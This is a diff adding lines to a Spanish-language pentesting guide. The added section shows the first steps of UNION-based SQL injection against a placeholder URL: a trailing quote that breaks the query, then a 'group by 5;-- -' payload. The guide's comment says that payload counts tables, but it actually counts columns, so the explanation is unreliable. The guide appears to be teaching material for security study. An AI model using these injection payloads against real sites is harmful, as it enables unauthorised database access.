@@ -119,6 +119,13 @@ Enumerar y detectar pluggins vulnerables tambien ayudaran a la intrusión.
 
 **Union Select**
 
+Empezaremos con una web de ejemplo:
 
+`http://fakesite.com/report.php?id=23`
 
+Lo primero que realizaremos, será obtener algún tipo de error, para ello intentaremos romper la Query.
+
+`http://fakesite.com/report.php?id=23' ` # Con una comilla final.
+`http://fakesite.com/report.php?id=23' group by 5;-- - ` # Intentamos sacar cuantas tablas tiene la BBDD.
+*A tener en cuenta, que a veces cuando sobre-excedemos con el group by, cierto contenido de la web, puede desaparecer*
 
